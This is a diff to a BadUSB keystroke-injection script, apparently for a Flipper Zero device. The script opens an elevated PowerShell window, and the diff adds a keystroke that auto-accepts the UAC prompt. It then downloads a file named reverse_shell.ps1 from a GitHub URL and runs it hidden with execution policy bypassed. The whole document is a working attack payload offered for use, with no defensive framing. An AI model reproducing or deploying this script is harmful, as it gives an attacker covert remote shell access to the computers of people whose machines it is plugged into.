@@ -1,17 +1,24 @@
 DELAY 2000
 GUI r
 DELAY 500
-REM Open PowerShell as administrator
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
+DELAY 1000
+
+REM Send the "Yes" response to UAC prompt (if required)
+DELAY 1000
+ALT y
 DELAY 500
 
 REM Download the PowerShell script
 STRING $url = "https://raw.githubusercontent.com/1tsMeMario/flipper_payloads/main/reverse_shell.ps1"; $output = "$env:TEMP\reverse_shell.ps1"; Invoke-WebRequest -Uri $url -OutFile $output;
 ENTER
-DELAY 500
+DELAY 1000
 
 REM Run the downloaded PowerShell script hidden
 STRING Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $output" -WindowStyle Hidden
 ENTER
 
+REM Exit PowerShell
+STRING exit
+ENTER
